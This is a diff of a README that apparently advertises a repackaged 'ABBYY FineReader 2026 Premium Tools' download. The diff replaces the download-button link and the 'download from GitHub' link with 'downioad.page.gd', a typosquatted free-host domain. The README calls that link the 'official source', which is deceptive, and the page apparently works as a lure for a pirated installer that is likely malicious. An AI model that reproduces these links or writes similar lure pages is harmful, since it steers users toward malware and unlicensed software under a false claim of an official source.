@@ -2,7 +2,7 @@
 
 ABBYY FineReader 2026 Premium Tools is an enhanced version of the renowned OCR software, designed for Windows desktop users in 2026. It provides comprehensive document processing features, including text recognition, PDF editing, and conversion tools to boost productivity and streamline workflows for professionals and enthusiasts alike. This tool builds upon the core capabilities of ABBYY FineReader, adding refined algorithms and a user-friendly interface for optimal performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -58,6 +58,6 @@ The tool supports a wide range of file types including PDF, TIFF, JPEG, PNG, and
 
 Get the latest version directly from the official source for safe and reliable access:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: 2026. This tool is provided as-is for educational and productivity enhancement purposes. Always use software in compliance with applicable laws and regulations.
